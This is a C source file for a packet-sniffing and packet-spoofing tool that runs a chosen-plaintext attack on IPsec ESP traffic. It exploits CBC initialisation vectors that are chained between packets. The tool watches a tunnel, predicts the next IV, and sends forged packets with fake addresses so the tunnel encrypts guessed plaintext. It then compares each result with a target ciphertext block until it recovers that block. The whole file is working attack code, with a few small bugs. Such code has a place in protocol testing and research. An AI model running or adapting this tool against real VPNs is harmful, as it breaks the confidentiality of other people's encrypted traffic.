#include "socket.h"
#include "ipsec_hack.h"
#include "lsw_select.h"

int listen_s;
int send_s;
struct sockaddr listen_sockaddr;
struct sockaddr send_sockaddr;
option_data *odata;

int make_a_dummy_packet(struct iphdr *ipH)
{
	ipH->version = 4;
	ipH->ihl = 5;
	ipH->tos = 0;
	ipH->tot_len = htons(80);
	ipH->id = 0x0123;
	ipH->frag_off = 0x0000;
	ipH->protocol = 17;
	ipH->ttl = 0xf0;
	return 1;
}

void update_the_guess(option_data *opt)
{
	opt->guess[0] += 1;

}

u8 send_test_packet(struct iphdr *ipH, option_data *opt)
{
	u8 *buf;
	u8 *t;
	struct ethhdr *ethh;
	int res, send_length, i;

	send_length = (htons(ipH->tot_len) + 14);
	buf = (u8 *)malloc(send_length);
	if (send_length > 255)
		printf("over 255\n");

	ethh = (struct ethhdr *)buf;

	memcpy(ethh->h_dest, opt->dmac, 6);
	memcpy(ethh->h_source, opt->smac, 6);

	ethh->h_proto = htons(0x0800);

	memcpy((&buf[14]), (u8 *)ipH, htons(ipH->tot_len));

	if (opt->verbose == 2) {
		for (i = 1; i <= htons(ipH->tot_len); i++)
			printf("%02x%s", buf[i - 1],
			       (i % 16 == 0 ? "\n" : " "));
	}

	res =
		sendto(send_s, buf, send_length, 0, &send_sockaddr,
		       sizeof(send_sockaddr));
	free(buf);
	if (res < 0) {
		perror("sendto");
		exit(1);
	}

	fflush(stdout);

	return 1;
}

int make_a_guess(u8 *guess, u8 *iv, u8 *old_iv, u8 *iph, option_data *opt)
{
	u8 needed_block[8];
	int i;
	u16 u16_tmp;
	struct iphdr *ipH;

	for (i = 0; i < 8; i++)
		needed_block[i] =
			(*(guess + i)) ^ (*(iv + i)) ^ (*(old_iv + i));

	/* Next step is to make a sanity check. needed_block
	   must fit into a IP header (for the routing attack) */
	ipH = (struct iphdr *)needed_block;

	if (ipH->version != 4)
		return -1;

	if (ipH->ihl != 5)
		return -1;

	if (htons(ipH->tot_len) < 20)
		return -1;

	if (htons(ipH->tot_len) > 1500)
		return -1;

	if (opt->rsv_bit && needed_block[6] & 0x80) /* Reserved flag */
		return -1;

	if (needed_block[6] & 0x40) /* Do not fragment */
		return -1;

	if ((((ipH->frag_off & 0x1FFF) << 3) + htons(ipH->tot_len)) > 65536) {
/*		if (opt->verbose > 1)*/
		printf("Fragment offset plus tot_len over 65536\n");
		return -1;
	}

	if (opt->verbose == 1)
		printf("guess length = %i\n", u16_tmp);

	/*
	   if ((needed_block[0]&0xf0)>>4 != 4)
		return -1;

	   if ((needed_block[0]&0x0f) != 5)
		return -1;

	   u16_tmp = (needed_block[2]<<8) + needed_block[3];




	   if (u16_tmp < ((needed_block[0]&0x0f)<<2) || u16_tmp > 1500)
		return -1;
	 */
	/* Now the block has passed as a part of the packet. Create the
	   rest of the packet. */

	memcpy(iph, needed_block, 8);

	return 1;

}

void user_ipv4_handler(u8 *packet, option_data *opt)
{
	struct iphdr *ipH;
	struct udphdr *udpH;
	struct ethhdr *ethh;
	EspHeader *espH;
	u8 buf[1540];
	u8 last_block[8];    /* first ciphertext block */
	int i, res;
	int p_len;
	int send_length;

	ethh = (struct ethhdr *)packet;
	ipH = (struct iphdr *)(packet + 14);

	if (opt->verbose > 2)
		printf("received packet\n\n");

	if (ethh->h_proto != 0x0008)
		return;

	/* Check the addresses and spi */
	if (htonl(ipH->saddr) != opt->src_address ||
	    htonl(ipH->daddr) != opt->dst_address) {
		if (opt->verbose > 1)
			printf("Wrong hosts\n");

		return;
	}

	/*printf("%x -> %x\n", htonl(ipH->source), htonl(ipH->dest));*/

	fflush(stdout);

	if (ipH->protocol != 50) {
		/* Not an ESP packet */
		if (opt->verbose)
			printf("not an ESP packet\n");
		return;
	}

	/* We have ESP packet. check the spi */
	espH = (EspHeader *)(((u8 *)ipH) + (ipH->ihl << 2));

	/* IF spi is zero and monitorin is enabled,
	   record spi from first ipsec packet */

	if (opt->spi == 0) {
		opt->spi = htonl(espH->spi);
		printf("Locked to SPI=0x%08x\n", opt->spi);
	}

	if (opt->spi != 0 && htonl(espH->spi) != opt->spi) {
/*		nli_timer_stop(spi_change_timer);
		nli_timer_start(spi_change_timer);*/
		if (opt->verbose > 1)
			printf("Wrong SPI %08x\n", espH->spi);
		return;
	}

	opt->spi_last_seen = time(NULL);

	if (((opt->packet_counter) % (opt->packet_print_intervall)) == 0) {
		printf("Packet counter = %i, time elapsed %i s\n",
		       opt->packet_counter,
		       (opt->spi_last_seen - opt->start_time));
	}

	p_len = htons(ipH->tot_len);

	if (opt->state == send_done) {
		if ((p_len >= opt->ap_len) &&
		    (p_len <= (opt->ap_len - opt->ap_overhead))) {
			printf("Attack packet length not in limits!\n");
			printf("Attack packet = %i, crypted = %i\n",
			       opt->ap_len, p_len);

		}
		printf("comparing esp iv ");
		for (i = 0; i < 8; i++)
			printf("%x ", espH->iv[i]);

		printf("\n last iv ");
		for (i = 0; i < 8; i++)
			printf("%x ", opt->last_iv[i]);
		printf("\n");

		if (memeq(espH->iv, opt->last_iv, 8)) {
			printf("iv prediction ok, comparing first ciphertext block\n");

			/* iv prediction ok, compare first ciphertext block */
			memcpy(last_block, espH->payloaddata, 8);

			if (memeq(last_block, opt->block_to_crack, 8)) {
				printf("correct guess!!!\n\n");
				printf("ciphertext\n");
				for (i = 0; i < 8; i++)
					printf("%02x ", last_block[i]);
				printf("\nguess\n");
				for (i = 0; i < 8; i++)
					printf("%02x ", opt->guess[i]);
				printf("\nPacket counter %i\n",
				       opt->packet_counter);
				printf("Guess counter %i\n",
				       opt->guess_counter);
				printf("Total time %i\n",
				       (time(NULL) - opt->start_time));
				exit(1);
			} else {
				printf("incorrect guess, updating guess\n");
				update_the_guess(opt);
				printf("guess\n");
				for (i = 0; i < 8; i++)
					printf("%x ", opt->guess[i]);
				printf("\n");
			}
		}
	}

	if (!memeq(espH->iv, opt->last_iv, 8) && opt->last_iv[0] != 0) {
		printf("IPsec is not chaining IV's between packets\n --> exiting\n\n");
		exit(0);
	}

	memcpy(opt->last_iv, ((u8 *)ipH) + p_len - 20, 8);

	/* Now we have packet -> crate an attemp packet */

	ipH = (struct iphdr *)buf;

	/*
	 * guess=guessed plaintext,
	 * last_iv=last ciphertext of THIS packet,
	 * original_iv=ciphertext block preceding the victim block
	 */
	if (make_a_guess(opt->guess, opt->last_iv, opt->original_iv, (u8 *)ipH,
			 opt) == -1) {
		if (opt->verbose > 1)
			printf("Unable to crate guess block\n");
		make_a_dummy_packet(ipH);
		opt->state = init;
		ipH->protocol = 17;
	} else {
		printf("packet lenght %i\n", ntohs(ipH->tot_len));
		printf("created a guess block  plaintext=");
		for (i = 0; i < 8; i++)
			printf("%02x", (int) opt->guess[i]);

		printf("  whole packet=\n");
		for (i = 0; i < ntohs(ipH->tot_len); i++)
			printf("%02x%s", (int) buf[i],
			       (i % 16 == 15 ? "\n" : " "));
		printf("\n");

		opt->guess_counter++;
		printf("Guess counter = %i\n", opt->guess_counter);
		opt->state = send_done;

		ipH->protocol = 50;
		opt->ap_len = htons(ipH->tot_len);
	}

	opt->packet_counter++;
	ipH->saddr = htonl(opt->fake_src_address);
	ipH->daddr = htonl(opt->fake_dst_address);
	ipH->ttl = 225;

	udpH = (struct udphdr *)(((u8 *)ipH) + (ipH->ihl << 2));
	udpH->source = htons(10001);
	udpH->dest = htons(10000);
	udpH->len = htons((htons(ipH->tot_len)) - (ipH->ihl << 2));
	udpH->check = 0;

	ipH->check = 0;
	ipH->check = ipheader_checksum((u16 *)ipH, ipH->ihl << 1);

	send_test_packet(ipH, opt);

}

void send_keepalive_packet(option_data *opt)
{
	u8 buf[1540];
	struct iphdr *ipH;
	struct udphdr *udpH;
	int i, len;

	ipH = (struct iphdr *)buf;
	make_a_dummy_packet(ipH);

	ipH->saddr = htonl(opt->fake_src_address);
	ipH->daddr = htonl(opt->fake_dst_address);

	ipH->ttl = 225;
	ipH->protocol = 17; /* UDP */

	udpH = (struct udphdr *)(((u8 *)ipH) + (ipH->ihl << 2));
	udpH->source = htons(10001);
	udpH->dest = htons(10000);
	udpH->len = htons((htons(ipH->tot_len)) - (ipH->ihl << 2));
	udpH->check = 0;

	ipH->check = 0;
	ipH->check = ipheader_checksum((u16 *)ipH, (ipH->ihl << 1));

	opt->state = init;
	send_test_packet(ipH, opt);

}

static
void user_signal_handler(int signum)
{

	switch (signum) {
	case SIGINT:
		fprintf(stderr, "Signal SIGINT received, exiting.\n\n");
		printf("Packet counter %i\n", odata->packet_counter);
		printf("Guess counter %i\n", odata->guess_counter);
		printf("Total time %i\n", (time(NULL) - odata->start_time));
		break;
	case SIGTERM:
		fprintf(stderr, "Signal SIGTERM received, exiting.\n\n");
		printf("Packet counter %i\n", odata->packet_counter);
		printf("Guess counter %i\n", odata->guess_counter);
		printf("Total time %i\n", (time(NULL) - odata->start_time));
		break;
	/*case SIGPIPE:*/
	default:
		fprintf(stderr, "Unknown signal %d received, exiting.\n\n",
			signum);
	}

	exit(0);
}

int main(int argc, char *argv[])
{
	option_data options = { 0 };
	lsw_fd_set rfds;
	struct timeval tv;
	int dmac_set = 0;
	int len;
	struct ifreq ifr;
	int i;
	int res;
	u8 buffer[BUFSIZE];
	time_t time_now;
	struct arpreq arpr;

	odata = &options;

	options.spi_wait_time = 10;
	options.packet_print_intervall = 1000;
	options.ap_overhead = 44;
	options.rsv_bit = 1;

	read_arguments(argc, argv, &options);

	for (i = 0; i < 6; i++) {
		if (options.dmac[i] != 0x00)
			dmac_set = 1;
	}

	if (!dmac_set) {
		printf("Error! Destination mac must be set\n");
		exit(0);
	}

	printf("Listening traffic between ");
	ipv4_print_address(htonl(options.src_address));
	printf(" and ");
	ipv4_print_address(htonl(options.dst_address));
	printf(" using fake IP src address ");
	ipv4_print_address(htonl(options.fake_src_address));
	printf("\n");
	printf(" using fake IP dst address ");
	ipv4_print_address(htonl(options.fake_dst_address));
	printf("\n");
	printf("Reserved bit check is %s\n", (options.rsv_bit ? "ON" : "OFF"));
	printf("Verbose mode %i\n", options.verbose);
	printf("SPI change detection is %s\n",
	       (options.spi_change_detection ? "ON" : "OFF"));

	printf("Block to crack is ");
	for (i = 0; i < 6; i++)
		printf("%02x%s", options.block_to_crack[i],
		       (i == 5 ? "\n" : ":"));
	printf("Initial guess is ");
	for (i = 0; i < 6; i++)
		printf("%02x%s", options.guess[i], (i == 5 ? "\n" : ":"));
	printf("Original IV is ");
	for (i = 0; i < 6; i++)
		printf("%02x%s", options.original_iv[i],
		       (i == 5 ? "\n" : ":"));
	if (options.spi == 0x00000000)
		printf("SPI not set -> taking SPI from first ESP packet\n");
	else
		printf("SPI 0x%08x\n", options.spi);

	/* Open socket for sending and listening */
	listen_s = safe_socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));
	if (listen_s < 0) {
		perror("socket");
		exit(1);
	}

	/* get local ethernet address. */
	len = sizeof(listen_sockaddr);
	bzero(&listen_sockaddr, len);
	listen_sockaddr.sa_family = AF_INET;
	strcpy(listen_sockaddr.sa_data, options.listen_if);

	bzero(&ifr, sizeof(ifr));
	strcpy(ifr.ifr_name, options.listen_if);
	if (ioctl(listen_s, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl(SIOCGIFHWADDR)");
		exit(1);
	}
	printf("local address in listen socket: %s is ", options.listen_if);
	for (i = 0; i < 6; i++) {
		printf("%02x%s", (ifr.ifr_hwaddr.sa_data [i]) & 0xff,
		       (i == 5) ? "" : ":");
	}
	printf(", address family 0x%x%s\n", ifr.ifr_hwaddr.sa_family,
	       (ifr.ifr_hwaddr.sa_family ==
		ARPHRD_ETHER) ? " (ethernet)" : "");

	/* Now the send if */
	send_s = safe_socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));
	if (send_s < 0) {
		perror("socket");
		exit(1);
	}

	/* get local ethernet address. */
	len = sizeof(send_sockaddr);
	bzero(&send_sockaddr, len);
	send_sockaddr.sa_family = AF_INET;
	strcpy(send_sockaddr.sa_data, options.send_if);

	bzero(&ifr, sizeof(ifr));
	strcpy(ifr.ifr_name, options.send_if);
	if (ioctl(send_s, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl(SIOCGIFHWADDR)");
		exit(1);
	}

/*	bzero (&arpr, sizeof(arpr));
	arpr.arp_pa.sa_family = AF_INET;
	memcpy(arpr.arp_pa.sa_data, (u8 *)&options.gw, 4);
	strcpy(arpr.arp_dev, options.send_if);
	if (ioctl (send_s, SIOCGARP, &arpr) < 0) {
		perror ("ioctl(SIOCGARP)");
		exit(1);
	}
 */

	for (i = 0; i < 6; i++)
		options.smac[i] = ifr.ifr_hwaddr.sa_data[i];

	printf("local address in send socket: %s is ", options.send_if);
	for (i = 0; i < 6; i++) {
		printf("%02x%s", (options.smac[i]) & 0xff,
		       (i == 5) ? "" : ":");
	}
	printf(", address family 0x%x%s\n", ifr.ifr_hwaddr.sa_family,
	       (ifr.ifr_hwaddr.sa_family ==
		ARPHRD_ETHER) ? " (ethernet)" : "");

	if (signal(SIGINT, user_signal_handler) == SIG_ERR ||
	    signal(SIGTERM, user_signal_handler) == SIG_ERR) {
		fprintf(stderr, "Error in setting a signal handler!\n");
		return -1;
	}

	/*  */
	options.state = init;

	LSW_FD_ZERO(&rfds);
	LSW_FD_SET(listen_s, &rfds);

	options.start_time = time(NULL);

	options.spi_last_seen = time(NULL);
	while (1) {
		LSW_FD_ZERO(&rfds);
		LSW_FD_SET(listen_s, &rfds);
		tv.tv_sec = 0;
		tv.tv_usec = 500000;
		len = sizeof(listen_sockaddr);
		res = 0;

		res = lsw_select((listen_s + 1), &rfds, NULL, NULL, &tv);
		if (res) {
			res = recvfrom(listen_s, buffer, BUFSIZE, 0,
				       &listen_sockaddr, &len);
			if (res < 0) {
				perror("recvfrom");
				exit(1);
			}

			user_ipv4_handler(buffer, &options);
			if (options.spi_change_detection) {
				time_now = time(NULL);
				if ((time_now - options.spi_last_seen) >
				    options.spi_wait_time &&
				    options.spi_last_seen != 0) {
					printf("SPI not seen for %i seconds\n",
					       options.spi_wait_time);
					exit(0);
				}
			}

		} else {
			if (options.state == send_done) {
				printf("senddoneK\n");

			}
			if (options.verbose)
				printf("Sending a keepalive packet\n");
			send_keepalive_packet(&options);
		}
	}

	return 1;
}
